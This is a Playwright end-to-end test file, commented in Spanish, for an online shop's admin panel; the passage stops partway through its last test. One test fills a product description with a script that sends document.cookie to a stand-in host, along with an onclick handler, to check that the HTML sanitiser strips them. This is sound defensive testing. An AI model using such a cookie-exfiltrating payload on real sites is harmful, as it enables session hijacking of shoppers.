import AxeBuilder from '@axe-core/playwright';
import { expect, test, type Page } from '@playwright/test';

/**
 * Los cuatro caminos del panel que, si se rompen, paran la tienda.
 *
 * No son los más vistosos: son los que alguien hace todos los días y que nadie
 * mira hasta que fallan. Traer mercancía, ponerle precio, mover un pedido y
 * cambiar la cara de la tienda. Un fallo en cualquiera de ellos no da un error
 * visible al cliente —da una tienda que deja de actualizarse, que es peor
 * porque tarda días en notarse.
 *
 * Se prueban contra el panel de verdad, con la API y la base en marcha, porque
 * lo que aquí se rompe casi nunca es el componente: es la costura entre el
 * formulario y lo que la API acepta.
 */

/** Credenciales del seed; solo válidas en local y en CI. */
const ADMIN = { email: 'admin@tienda.local', password: 'Admin1234!' };

/**
 * Entra al panel dejándolo listo para trabajar.
 *
 * El token del panel vive en memoria a propósito —en localStorage un XSS se lo
 * llevaría— así que no se puede inyectar una sesión: hay que pasar por el
 * formulario en cada prueba.
 *
 * Se espera a que la aplicación pinte ALGO antes de decidir qué hacer.
 * Preguntar directamente si el formulario está visible no espera: en un
 * arranque lento devuelve `false`, se salta el login y la prueba se queda
 * mirando un menú que nunca aparece. Ese fue el motivo de que estas pruebas
 * fallaran unas veces sí y otras no.
 */
async function entrar(page: Page): Promise<void> {
  await page.goto('/');

  const menu = page.getByRole('link', { name: 'Productos', exact: true });
  const email = page.getByLabel('Email', { exact: true });

  await expect(menu.or(email).first()).toBeVisible({ timeout: 30_000 });

  if (await email.isVisible()) {
    await email.fill(ADMIN.email);
    await page.getByLabel('Contraseña', { exact: true }).fill(ADMIN.password);
    await page.getByRole('button', { name: 'Entrar' }).click();
  }

  // Se espera a un enlace concreto y no al landmark de navegación: el menú es
  // un `aside` posicionado con transformaciones y el rol `navigation` de dentro
  // no siempre resuelve como visible.
  await expect(menu).toBeVisible({ timeout: 30_000 });
}

test.describe('Panel de administración', () => {
  test.beforeEach(async ({ page }) => {
    await entrar(page);
  });

  test('se entra al panel y se ve el menú', async ({ page }) => {
    // La comprobación más básica y la que más veces salva: si el panel no
    // carga, ninguna de las demás pruebas significa nada.
    await expect(page.getByRole('link', { name: 'Pedidos', exact: true })).toBeVisible();
    await expect(page.getByRole('link', { name: 'Ajustes', exact: true })).toBeVisible();
  });

  test('las acciones sin datos llegan al servidor', async ({ page }) => {
    /*
     * Regresión de un fallo que rompía media docena de botones a la vez.
     *
     * El cliente de la API declaraba `Content-Type: application/json` en TODAS
     * las peticiones, también en los POST que no llevan cuerpo. Fastify los
     * rechaza antes de llegar a la aplicación —«Body cannot be empty when
     * content-type is set to application/json»— así que autorizar un
     * proveedor, cerrar un pedido, liberar uno retenido, aprobar una
     * devolución o cerrar sesión devolvían 400 sin que nada se viera.
     *
     * Se prueba con el cierre de sesión porque es el único de esa familia que
     * existe en cualquier instalación, sin depender de que haya pedidos o
     * proveedores configurados. Y porque su fallo era el más grave: la
     * pantalla te sacaba igual, pero la sesión seguía viva en el servidor.
     */
    const respuesta = page.waitForResponse(
      (r) => r.url().includes('/api/v1/auth/logout') && r.request().method() === 'POST',
    );

    // Cerrar sesión vive dentro del menú de la cuenta, en la esquina de la
    // barra superior: hay que abrirlo antes.
    await page.getByRole('button', { name: /cuenta de/i }).click();
    await page.getByRole('menuitem', { name: /cerrar sesión|salir/i }).click();

    expect((await respuesta).status()).toBeLessThan(400);
    await expect(page.getByLabel('Email', { exact: true })).toBeVisible({ timeout: 20_000 });
  });

  test('el menú resalta la pantalla en la que se está', async ({ page }) => {
    // El menú decidía la entrada activa comparando rutas a mano, y se
    // equivocaba: estando en /pedidos resaltaba «Panel». No rompe nada, pero
    // en un panel de veinticinco pantallas la única referencia de dónde estás
    // es esa marca, y si miente desorienta más que si no estuviera.
    //
    // Se mira `data-status`, que es lo que pone el enrutador, y no el color:
    // el color va con transición y medirlo a media animación da lecturas
    // falsas —así se llegó a creer que el fallo estaba arreglado cuando no—.
    const activos = () => page.locator('aside nav a[data-status="active"]');

    await expect(activos()).toHaveText(['Panel']);

    for (const destino of ['Pedidos', 'Productos', 'Clientes']) {
      await page.getByRole('link', { name: destino, exact: true }).click();
      await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

      // Exactamente una, y la que toca: dos entradas resaltadas a la vez es el
      // otro fallo posible, y la raíz prefija todas las rutas.
      await expect(activos()).toHaveText([destino]);
    }
  });

  test('se puede buscar en el catálogo de un proveedor', async ({ page }) => {
    await page.getByRole('link', { name: 'Importar productos' }).click();

    // Sin proveedor listo la pantalla lo dice y explica por qué; con uno
    // listo, aparece el selector. Las dos cosas son respuestas válidas, y lo
    // que no puede pasar es que se quede muda: eso fue exactamente el fallo
    // que dejó el importador inutilizable sin que nadie supiera por qué.
    const selector = page.getByRole('combobox', { name: /proveedor/i });
    const sinProveedores = page.getByText(/ningún proveedor está listo/i);

    await expect(selector.or(sinProveedores).first()).toBeVisible();

    if (!(await selector.isVisible().catch(() => false))) {
      test.skip(true, 'No hay ningún proveedor listo en este entorno');
      return;
    }

    // Se elige el primer proveedor real (la primera opción es el marcador).
    const opciones = await selector.locator('option').all();
    expect(opciones.length).toBeGreaterThan(1);
    await selector.selectOption({ index: 1 });

    await page.getByRole('searchbox').first().fill('a');
    await page.getByRole('button', { name: 'Buscar' }).first().click();

    // O hay resultados, o hay un motivo. Una tabla vacía y en silencio es lo
    // que hacía creer que el proveedor no tenía catálogo.
    await expect(
      page
        .getByRole('table')
        .or(page.getByRole('alert'))
        .or(page.getByText(/sin datos/i))
        .first(),
    ).toBeVisible({ timeout: 30_000 });
  });

  test('se puede cambiar el precio de un producto', async ({ page }) => {
    await page.getByRole('link', { name: 'Productos', exact: true }).click();
    await expect(page.getByRole('table')).toBeVisible();

    // «Editar» abre la ficha del producto en su propia pantalla: dejó de ser
    // un acordeón dentro de la fila cuando la edición pasó a tener sitio
    // propio.
    await page.getByRole('link', { name: 'Editar' }).first().click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

    const precio = page.getByLabel('Precio (€)').first();
    await expect(precio).toBeVisible();

    const anterior = await precio.inputValue();
    const nuevo = (Number(anterior.replace(',', '.')) + 1).toFixed(2);

    await precio.fill(nuevo);
    // Se guarda al salir del campo, no con un botón: se comprueba que ese
    // guardado implícito de verdad llega a la API.
    await precio.blur();

    await expect(page.getByRole('status').filter({ hasText: /guardado/i })).toBeVisible({
      timeout: 15_000,
    });

    // Y que persiste: recargar es la única forma de distinguir "se ha
    // guardado" de "se ha pintado en la pantalla".
    // Recargar la propia ficha: al tener dirección propia, volver a ella es
    // recargar, no rehacer el camino desde el listado. Es justamente la ventaja
    // de que la edición viva en su URL.
    await page.reload();

    const guardado = page.getByLabel('Precio (€)').first();
    await expect(guardado).toHaveValue(nuevo);

    // Se deja como estaba. Si no, cada ejecución encarece un euro el mismo
    // producto y a la vigésima el catálogo de desarrollo no se parece a nada.
    await guardado.fill(anterior);
    await guardado.blur();
    await expect(page.getByRole('status').filter({ hasText: /guardado/i })).toBeVisible({
      timeout: 15_000,
    });
  });

  test('un precio tachado imposible se rechaza y se explica', async ({ page }) => {
    // Anunciar un "antes" más barato que el "ahora" es práctica desleal. Que
    // la API lo rechace ya está probado; lo que se comprueba aquí es que el
    // panel enseña el motivo en vez de tragárselo.
    await page.getByRole('link', { name: 'Productos', exact: true }).click();
    await page.getByRole('link', { name: 'Editar' }).first().click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

    const tachado = page.getByLabel('Precio tachado (€)').first();
    await tachado.fill('0.01');
    await tachado.blur();

    await expect(page.getByRole('alert')).toBeVisible({ timeout: 15_000 });
  });

  test('el listado de pedidos responde y enseña sus números', async ({ page }) => {
    await page.getByRole('link', { name: 'Pedidos', exact: true }).click();

    await expect(page.getByRole('heading', { name: /pedidos/i }).first()).toBeVisible({
      timeout: 20_000,
    });

    // Lo que no puede pasar: que la pantalla reviente. Es donde soporte busca
    // un pedido cuando llama un cliente.
    await expect(page.getByRole('alert')).toHaveCount(0);

    // Con pedidos, su número tiene que verse: es lo único por lo que se busca.
    // Sin ellos —una tienda recién instalada— la tabla está vacía y también es
    // una respuesta válida, así que se cuenta en lugar de exigir.
    const numeros = page.getByText(/ES-\d{4}-\d{6}/);
    const cuantos = await numeros.count();

    if (cuantos > 0) {
      await expect(numeros.first()).toBeVisible();
    } else {
      await expect(
        page
          .getByRole('table')
          .or(page.getByText(/sin datos/i))
          .first(),
      ).toBeVisible();
    }
  });

  test('se pueden ver los pedidos más allá de la primera página', async ({ page }) => {
    // La razón de ser de esta prueba: el panel pedía las primeras 50 filas y se
    // quedaba ahí, ignorando el cursor que la API lleva devolviendo desde el
    // principio. Con más de 50 pedidos, los siguientes no había forma de verlos
    // desde el panel —no era un detalle de interfaz, era la tienda dejando de
    // poder gestionarse en cuanto crecía—.
    await page.getByRole('link', { name: 'Pedidos', exact: true }).click();
    await expect(page.getByRole('heading', { level: 1, name: /pedidos/i })).toBeVisible({
      timeout: 20_000,
    });

    // Hay que esperar a la tabla antes de buscar el botón: mientras la lista
    // carga no existe ninguno de los dos, y preguntar antes de tiempo hace que
    // la prueba se salte sola dando la sensación de que ha pasado.
    const filas = page.getByRole('table').getByRole('row');
    await expect(filas.first()).toBeVisible({ timeout: 20_000 });

    const verMas = page.getByRole('button', { name: /ver más/i });

    // Con pocos pedidos no hay página siguiente y el botón no debe aparecer:
    // un "ver más" que no lleva a ninguna parte es peor que no tenerlo.
    if ((await verMas.count()) === 0) {
      test.skip(true, 'La tienda de pruebas no tiene pedidos suficientes para paginar');
      return;
    }

    const antes = await filas.count();

    await verMas.click();
    await expect.poll(() => filas.count(), { timeout: 20_000 }).toBeGreaterThan(antes);

    // El recuento del encabezado tiene que seguir a lo cargado. Antes ponía el
    // tamaño de página como si fuera el total: «Pedidos 50» con trescientos en
    // la base, sin ninguna señal de que faltaba algo.
    // Y las filas nuevas son pedidos de verdad, no huecos: se comprueba que
    // siguen apareciendo números de pedido con el formato real.
    await expect(page.getByText(/ES-\d{4}-\d{6}/).last()).toBeVisible();
  });

  test('el Kanban de pedidos carga con sus columnas', async ({ page }) => {
    // Es la pantalla desde la que se mueve el trabajo del día. Que cargue con
    // sus columnas es lo mínimo: sin ellas no hay dónde soltar nada.
    await page.getByRole('link', { name: 'Tablero' }).click();

    await expect(page.getByRole('heading', { name: /tablero de pedidos/i })).toBeVisible({
      timeout: 20_000,
    });

    // Al menos una columna. Sin columnas no hay tablero: es una pantalla en
    // blanco con un título.
    await expect(page.getByRole('heading', { level: 2 }).first()).toBeVisible();
  });

  test('las devoluciones y reembolsos tienen su pantalla', async ({ page }) => {
    await page.getByRole('link', { name: 'Devoluciones' }).click();

    // Con o sin devoluciones pendientes, la pantalla tiene que responder: es
    // donde se gestiona el dinero que se devuelve, y una pantalla rota aquí
    // significa un cliente esperando su reembolso sin que nadie lo vea.
    //
    // Se comprueba el encabezado y la sección de pendientes, que es lo que esta
    // pantalla tiene de verdad. Antes se esperaba una `<table>` o el texto
    // «sin datos», y aquí no hay ni una cosa ni la otra: la afirmación no podía
    // cumplirse con ninguna versión de la pantalla, así que la prueba no
    // comprobaba nada, solo fallaba.
    await expect(page.getByRole('heading', { level: 1, name: /devoluciones/i })).toBeVisible({
      timeout: 20_000,
    });
    await expect(
      page.getByRole('heading', { level: 2, name: /pendientes/i }).first(),
    ).toBeVisible();
  });

  test('se recorta una foto del producto y se guarda', async ({ page }) => {
    /*
     * El recorte se hace en el navegador, y ahí tiene una forma de fallar que
     * no da error: las fotos vienen del almacenamiento de objetos, que es otro
     * origen, y si se cargan sin modo CORS el navegador deja pintarlas en un
     * canvas pero prohíbe leerlo. El botón de guardar no hacía nada —ni un
     * aviso— y el problema parecía estar en la subida.
     *
     * Por eso esta prueba llega hasta la petición: comprobar que el modal se
     * abre no habría detectado nada.
     */
    await page.getByRole('link', { name: 'Productos', exact: true }).click();
    await page.getByRole('link', { name: 'Editar' }).first().click();
    await page.getByRole('tab', { name: 'Imágenes' }).click();

    const antes = await page.locator('.galeria-item').count();
    expect(antes).toBeGreaterThan(0);

    await page.getByRole('button', { name: 'Recortar' }).first().click();
    await expect(page.getByRole('dialog')).toBeVisible();

    // Sin `naturalWidth` el recorte saldría de tamaño cero: hay que esperar a
    // que la imagen esté cargada de verdad, no solo a que el modal exista.
    await expect
      .poll(
        () => page.locator('.recorte-imagen').evaluate((i: HTMLImageElement) => i.naturalWidth),
        { timeout: 15_000 },
      )
      .toBeGreaterThan(0);

    await page.getByRole('button', { name: '1:1' }).click();

    const subida = page.waitForResponse(
      (r) => r.url().includes('/media/upload') && r.request().method() === 'POST',
      { timeout: 30_000 },
    );
    await page.getByRole('button', { name: 'Guardar recorte' }).click();
    const respuesta = await subida;
    expect(respuesta.status(), await respuesta.text()).toBeLessThan(300);

    // El recorte entra como imagen nueva y la original se queda.
    await expect(page.locator('.galeria-item')).toHaveCount(antes + 1, { timeout: 20_000 });

    // Y se deshace: si no, cada ejecución deja una foto más en el mismo
    // producto y la galería de desarrollo acaba con veinte recortes iguales.
    await page.locator('.galeria-item').last().getByRole('button', { name: 'Eliminar' }).click();
    await page.getByRole('dialog').getByRole('button', { name: 'Eliminar' }).click();
    await expect(page.locator('.galeria-item')).toHaveCount(antes, { timeout: 20_000 });
  });

  test('el menú contraído deja leer la etiqueta de cada icono', async ({ page }) => {
    /*
     * Contraído, el menú es solo iconos: la etiqueta que sale al pasar por
     * encima es lo único que dice a dónde lleva cada uno. Y esa etiqueta vive
     * dentro de un contenedor con scroll, que recorta a sus hijos: salía cortada
     * («etenidos» en vez de «Retenidos») sin que nada fallara.
     *
     * Se comprueba lo que de verdad importa —que la etiqueta quepa entera en
     * pantalla— y no que exista, porque existía.
     */
    await page.getByRole('button', { name: /Contraer|Colapsar|Plegar/ }).click();

    const iconos = page.locator('.lateral-enlace-solo-icono');
    await expect(iconos.first()).toBeVisible();

    /*
     * El enlace ocupa el ancho del carril: si el envoltorio lo encoge, el icono
     * se va contra el borde y el área pulsable se queda en el tamaño del dibujo.
     *
     * Con `poll` porque el menú cambia de ancho con una transición: medido al
     * vuelo, el carril daba los 92 px de la mitad de la animación.
     */
    await expect
      .poll(
        () =>
          page.evaluate(() => {
            const carril = document.querySelector('.lateral');
            const enlace = document.querySelector('.lateral-enlace-solo-icono');
            if (!carril || !enlace) return 0;
            return enlace.getBoundingClientRect().width / carril.clientWidth;
          }),
        { timeout: 5_000 },
      )
      .toBeGreaterThan(0.6);

    await iconos.nth(3).hover();
    const etiqueta = page.getByRole('tooltip');
    await expect(etiqueta).toBeVisible();

    const caja = await etiqueta.boundingBox();
    const ancho = page.viewportSize()?.width ?? 0;
    if (!caja) throw new Error('el tooltip no tiene caja');
    // Entera y dentro de la pantalla por los dos lados.
    expect(caja.x).toBeGreaterThanOrEqual(0);
    expect(caja.x + caja.width).toBeLessThanOrEqual(ancho);
    // Y a la derecha del icono, no encima del siguiente.
    const icono = await iconos.nth(3).boundingBox();
    expect(caja.x).toBeGreaterThanOrEqual((icono?.x ?? 0) + (icono?.width ?? 0) - 1);

    // Se deja desplegado: queda guardado en el navegador y las demás pruebas
    // esperan encontrar el menú con sus etiquetas.
    await page.getByRole('button', { name: /Desplegar|Expandir/ }).click();
    await expect(page.getByRole('link', { name: 'Productos', exact: true })).toBeVisible();
  });

  test('la cola de incidencias del proveedor tiene pantalla y datos', async ({ page }) => {
    /*
     * Esta prueba existe por un fallo concreto: el servicio que calcula las
     * incidencias de compra al proveedor estaba escrito y probado, pero
     * **ningún controlador lo exponía**. La tarea figuraba como terminada y en
     * el panel no había nada, así que un pedido cobrado que no se llegaba a
     * comprar se quedaba en la base de datos sin que nadie se enterase hasta
     * que escribía el cliente.
     *
     * Por eso se comprueba la respuesta de la API y no solo que la pantalla
     * pinte: lo que faltaba era la ruta, y una pantalla vacía se ve igual que
     * una pantalla sin incidencias.
     */
    const consulta = page.waitForResponse(
      (r) => r.url().includes('/orders/incidencias') && r.request().method() === 'GET',
      { timeout: 30_000 },
    );

    await page.getByRole('link', { name: 'Incidencias', exact: true }).click();

    const respuesta = await consulta;
    expect(respuesta.status(), await respuesta.text()).toBe(200);

    const cola = (await respuesta.json()) as unknown[];
    expect(Array.isArray(cola)).toBe(true);

    await expect(page.getByRole('heading', { level: 1 })).toContainText(/Incidencias/i);

    // La pantalla tiene que enseñar exactamente lo que trae la API: ni una
    // tarjeta de menos —una incidencia que no se ve es una que nadie atiende—
    // ni el estado vacío cuando hay algo.
    if (cola.length === 0) {
      await expect(page.getByText(/No hay ninguna incidencia/i)).toBeVisible();
    } else {
      await expect(page.locator('article.panel')).toHaveCount(cola.length);

      /*
       * Y con salidas, no solo con «reintentar».
       *
       * Un pedido cobrado que no se pudo comprar y solo admite reintentar se
       * queda atascado para siempre cuando el reintento no va a funcionar
       * —porque el proveedor subió el precio, o porque ya se compró a mano—. Con
       * el cliente esperando y sin nada que hacer desde el panel.
       */
      const primera = page.locator('article.panel').first();
      await expect(primera.getByRole('button', { name: 'Reintentar' })).toBeVisible();
      await expect(primera.getByRole('button', { name: 'Comprado a mano' })).toBeVisible();
      await expect(primera.getByRole('link', { name: 'Ver el pedido' })).toBeVisible();

      // La referencia del proveedor es obligatoria para cerrarla.
      await primera.getByRole('button', { name: 'Comprado a mano' }).click();
      await expect(primera.getByRole('button', { name: 'Cerrar incidencia' })).toBeDisabled();
      await primera.getByLabel(/Nº de pedido en el proveedor/).fill('8171234567890123');
      await expect(primera.getByRole('button', { name: 'Cerrar incidencia' })).toBeEnabled();
    }
  });

  test('el detalle del pedido trae la compra al proveedor', async ({ page }) => {
    /*
     * El contrato, no la pintura: el bloque «Compra al proveedor» solo aparece
     * cuando hay compras, así que comprobarlo en pantalla dependería de que el
     * pedido de turno tenga una. Lo que no puede faltar nunca es el campo.
     *
     * Sin él, el panel enseñaba el coste del proveedor pero no la referencia
     * con la que reclamar ni si la compra había fallado.
     */
    await page.getByRole('link', { name: 'Pedidos', exact: true }).click();
    await expect(page.getByRole('table')).toBeVisible();

    const detalle = await page.evaluate(async () => {
      const sesion = await fetch('/api/v1/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
        credentials: 'include',
      });
      const { accessToken } = (await sesion.json()) as { accessToken: string };
      const cabeceras = { Authorization: `Bearer ${accessToken}` };

      const lista = await fetch('/api/v1/orders?limite=1', { headers: cabeceras });
      const { items } = (await lista.json()) as { items: { id: string }[] };
      if (!items[0]) return null;

      const uno = await fetch(`/api/v1/orders/${items[0].id}`, { headers: cabeceras });
      return (await uno.json()) as { subPedidos?: unknown };
    });

    expect(detalle).not.toBeNull();
    expect(Array.isArray(detalle?.subPedidos)).toBe(true);
  });

  test('la descripción guarda HTML seguro y lo sirve como HTML', async ({ page }) => {
    /*
     * Esta prueba cubre una vulnerabilidad, no una comodidad.
     *
     * La descripción de un producto la escribe un tercero —cualquier vendedor de
     * AliExpress— y la tienda la pinta como HTML para que las listas y las tablas
     * de medidas se vean. Si se guardara sin limpiar, un `<script>` en la
     * descripción de un producto importado sería código ajeno ejecutándose en
     * nuestro dominio con la sesión del cliente delante.
     *
     * Se comprueba lo que queda GUARDADO, no lo que se pinta: el saneado está en
     * la entrada a propósito, para que cualquier otro consumidor del mismo campo
     * —una app, un canal de venta, un correo— lo reciba ya limpio.
     */
    await page.getByRole('link', { name: 'Productos', exact: true }).click();
    await page.getByRole('link', { name: 'Editar' }).first().click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

    const area = page.locator('textarea.font-mono').first();
    await expect(area).toBeVisible();
    const anterior = await area.inputValue();

    const guardado = page.waitForResponse(
      (r) => r.url().includes('/catalog/products/') && r.request().method() === 'PATCH',
      { timeout: 20_000 },
    );
    await area.fill(
      '<p>Texto <strong>en negrita</strong></p>' +
        '<script>fetch("//malo.example?c="+document.cookie)</script>' +
        '<p style="width:750px" onclick="alert(1)">Con estilo del proveedor</p>',
    );
    await area.blur();
    expect((await guardado).status()).toBeLessThan(300);

    await page.reload();
    await expect(page.locator('textarea.font-mono').first()).toBeVisible({ timeout: 20_000 });
    const limpio = await page.locator('textarea.font-mono').first().inputValue();

    // El formato útil se queda…
    expect(limpio).toContain('<strong>en negrita</strong>');
    // …y todo lo que ejecuta o descuadra, no.
    expect(limpio).not.toContain('script');
    expect(limpio).not.toContain('document.cookie');
    expect(limpio).not.toContain('onclick');
    expect(limpio).not.toContain('style=');

    // Y llega a la tienda como HTML, que es el motivo de conservarlo. Se toma el
    // slug del producto que se está editando: es el único del que se sabe con
    // seguridad que acaba de guardarse.
    const productId = new URL(page.url()).pathname.split('/').pop() ?? '';

    const servido = await page.evaluate(async (id: string) => {
      const sesion = await fetch('/api/v1/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
        credentials: 'include',
      });
      const { accessToken } = (await sesion.json()) as { accessToken: string };

      const detalle = await fetch(`/api/v1/catalog/products/${id}`, {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      const datos = (await detalle.json()) as {
        translations: { locale: string; slug: string; description: string | null }[];
      };
      const es = datos.translations.find((t) => t.locale === 'es');
      if (!es) return { guardado: null, publico: null };

      const ficha = await fetch(`/api/v1/catalog/products/by-slug/es/${es.slug}`);
      if (!ficha.ok) return { guardado: es.description, publico: null };

      const publica = (await ficha.json()) as {
        translations: { locale: string; description: string | null }[];
      };
      return {
        guardado: es.description,
        publico: publica.translations.find((t) => t.locale === 'es')?.description ?? null,
      };
    }, productId);

    // Lo que la API entrega es HTML de verdad, con la etiqueta intacta.
    expect(servido.guardado).toContain('<strong>');
    expect(servido.guardado).not.toContain('script');

    // Y si el producto está publicado, lo mismo por la vía pública.
    if (servido.publico !== null) {
      expect(servido.publico).toContain('<strong>');
      expect(servido.publico).not.toContain('script');
    }

    // Se deja como estaba: si no, cada ejecución reescribe la ficha del mismo
    // producto y el catálogo de desarrollo deja de parecerse a nada.
    const volver = page.locator('textarea.font-mono').first();
    await volver.fill(anterior);
    await volver.blur();
  });

  test('se puede cambiar la marca de la tienda', async ({ page }) => {
    await page.getByRole('link', { name: 'Ajustes', exact: true }).click();

    // El color de marca se inyecta en el CSS de la tienda: un valor que no
    // valide es la vía por la que se colaría contenido en la hoja de estilos,
    // así que el campo tiene que existir y aceptar solo colores.
    const color = page.getByLabel(/color/i).first();
    await expect(color).toBeVisible({ timeout: 20_000 });

    const anterior = await color.inputValue();
    expect(anterior).toMatch(/^#[0-9a-fA-F]{3,8}$/);
  });

  test('un pedido se puede marcar como pagado a mano', async ({ page }) => {
    /*
     * Esto existe porque el aviso de la pasarela puede no llegar nunca —el
     * webhook sin dar de alta, una transferencia— y entonces el dinero está en la
     * cuenta y el pedido se queda esperando para siempre.
     *
     * La prueba **crea su propio pedido** en lugar de coger uno de la lista: si
     * cogiera uno de la lista, cada ejecución dejaría un pedido pagado de más y
     * al cabo de unas cuantas no quedaría ninguno esperando pago con el que
     * probar. Lo que se comprueba aquí es la costura del panel; que el pago
     * arrastre el stock y el fulfillment lo comprueban las pruebas de
     * integración de la API, que pueden mirar dentro.
     */
    const creado = await page.evaluate(async () => {
      const buscar = await fetch('/api/v1/search?limite=1');
      const { hits } = (await buscar.json()) as { hits: { slug: string }[] };
      const slug = hits[0]?.slug;
      if (!slug) return { error: 'sin catálogo publicado' };

      const ficha = await fetch(`/api/v1/catalog/products/by-slug/es/${slug}`);
      const producto = (await ficha.json()) as { variants: { id: string; stock: number }[] };
      const variante = producto.variants.find((v) => v.stock > 0);
      if (!variante) return { error: 'sin variantes con stock' };

      const pedido = await fetch('/api/v1/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'e2e-marcar-pagado@ejemplo.es',
          locale: 'es',
          cartId: `e2e-pagado-${String(Date.now())}`,
          lineas: [{ variantId: variante.id, quantity: 1 }],
          shippingAddress: {
            firstName: 'Ana',
            lastName: 'Pruebas',
            line1: 'Calle Mayor 1',
            city: 'Madrid',
            province: 'Madrid',
            postalCode: '28013',
            countryCode: 'ES',
          },
        }),
      });

      if (!pedido.ok) return { error: `la API rechazó el pedido: ${String(pedido.status)}` };
      return (await pedido.json()) as { id: string; number: string };
    });

    expect(creado, 'no se ha podido crear el pedido de prueba').not.toHaveProperty('error');
    const numero = (creado as { number: string }).number;

    await page.getByRole('link', { name: 'Pedidos', exact: true }).click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

    // Se busca por su número: la lista está ordenada por fecha, pero no hay que
    // dar por hecho que el nuevo es el primero.
    await page.getByPlaceholder(/pedido o email/i).fill(numero);
    await page.getByRole('cell', { name: numero }).first().click();

    const marcar = page.locator('[data-prueba="marcar-pagado"]');
    await expect(marcar).toBeVisible({ timeout: 20_000 });
    await marcar.click();

    // El motivo es obligatorio: es lo único que explicará en seis meses por qué
    // este pedido consta pagado sin que ninguna pasarela lo dijera.
    const confirmar = page.locator('[data-prueba="confirmar-pagado"]');
    await expect(confirmar).toBeDisabled();

    await page.getByLabel('Por qué lo marcas').fill('Transferencia recibida, prueba e2e');
    await expect(confirmar).toBeEnabled();

    const guardado = page.waitForResponse(
      (r) => r.url().includes('/marcar-pagado') && r.request().method() === 'POST',
      { timeout: 20_000 },
    );
    await confirmar.click();
    expect((await guardado).status()).toBe(200);

    // El historial lo cuenta como lo que es: algo que hizo una persona.
    await expect(page.getByText(/Pago marcado a mano/)).toBeVisible({ timeout: 20_000 });
    // Y el cobro queda registrado como manual, no como si lo hubiera cobrado
    // una pasarela.
    await expect(page.getByText('manual', { exact: true })).toBeVisible();
  });

  test('el menú de la tienda se edita aquí y llega a la tienda', async ({ page }) => {
    /*
     * La sub-barra de la tienda sale de esta pantalla. Lo que se comprueba es la
     * cadena entera —se añade un enlace, se guarda, la API pública lo sirve—
     * porque cada mitad por su cuenta ya funcionaba antes: lo que faltaba era
     * justo que estuvieran unidas.
     *
     * Se deja el menú como estaba al terminar. Sin eso, cada ejecución añade un
     * enlace a la tienda de desarrollo y a la décima pasada la cabecera es una
     * fila de «Prueba e2e».
     */
    const antes = await page.evaluate(async () => {
      const sesion = await fetch('/api/v1/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
        credentials: 'include',
      });
      const { accessToken } = (await sesion.json()) as { accessToken: string };
      const respuesta = await fetch('/api/v1/content/admin/menu', {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      return { token: accessToken, enlaces: (await respuesta.json()) as unknown[] };
    });

    await page.getByRole('link', { name: 'Menú de la tienda' }).click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });

    // Un enlace a una dirección: es el único tipo que no depende de que haya
    // páginas o categorías en el catálogo de quien ejecute la prueba.
    const anadir = page.getByRole('button', { name: /^\+ Dirección$/ });
    // Se espera al botón ANTES de contar: mientras carga, la pantalla es un
    // esqueleto sin secciones y contar ahí da cero, así que la comprobación de
    // «una más» se cumplía sola.
    await expect(anadir).toBeVisible({ timeout: 20_000 });

    const secciones = page.locator('section.panel');
    const cuantos = await secciones.count();

    await anadir.click();
    await expect(secciones).toHaveCount(cuantos + 1);

    const nueva = secciones.last();
    await nueva.getByLabel('Dirección', { exact: true }).fill('/buscar?e2e=1');
    await nueva.getByLabel(/Texto del enlace/).fill('Prueba e2e');

    const guardado = page.waitForResponse(
      (r) => r.url().includes('/content/admin/menu') && r.request().method() === 'POST',
      { timeout: 20_000 },
    );
    await page.getByRole('button', { name: 'Guardar', exact: true }).click();
    expect((await guardado).status()).toBeLessThan(300);

    // Y en la tienda: por la vía pública, sin sesión, que es como lo pide.
    const publico = await page.evaluate(async () => {
      const r = await fetch('/api/v1/content/menu/es');
      return (await r.json()) as { enlaces: { etiqueta: string; href: string }[] };
    });

    expect(publico.enlaces.map((e) => e.etiqueta)).toContain('Prueba e2e');
    expect(publico.enlaces.find((e) => e.etiqueta === 'Prueba e2e')?.href).toBe('/buscar?e2e=1');

    // Se deja como estaba.
    await page.evaluate(async (previo: { token: string; enlaces: unknown[] }) => {
      await fetch('/api/v1/content/admin/menu', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${previo.token}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ enlaces: previo.enlaces }),
      });
    }, antes);
  });

  test('la política de privacidad se redacta y se publica desde el panel', async ({ page }) => {
    /*
     * El texto legal que la tienda enseña sale de esta pantalla, y hasta que
     * existió no había forma de tocarlo sin entrar en la base de datos: la
     * semilla creaba las seis páginas obligatorias en borrador, con un texto que
     * empieza por «PENDIENTE DE COMPLETAR».
     *
     * Se prueba la cadena entera —se redacta, se publica, la tienda lo sirve por
     * la vía pública— porque las dos mitades ya funcionaban por separado; lo que
     * faltaba era que estuvieran unidas.
     *
     * Se publica dentro de la prueba a propósito, en vez de dar por hecho que ya
     * lo está: la semilla las deja en borrador y así la prueba vale igual en un
     * entorno recién instalado que en uno donde ya se publicaron.
     */
    const antes = await page.evaluate(async () => {
      const sesion = await fetch('/api/v1/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
        credentials: 'include',
      });
      const { accessToken } = (await sesion.json()) as { accessToken: string };

      const lista = (await (
        await fetch('/api/v1/content/admin/pages', {
          headers: { Authorization: `Bearer ${accessToken}` },
        })
      ).json()) as { id: string; handle: string }[];

      const id = lista.find((p) => p.handle === 'privacidad')?.id ?? '';
      const detalle = (await (
        await fetch(`/api/v1/content/admin/pages/${id}`, {
          headers: { Authorization: `Bearer ${accessToken}` },
        })
      ).json()) as {
        id: string;
        handle: string;
        status: string;
        translations: { locale: string; title: string; slug: string; content: string }[];
      };

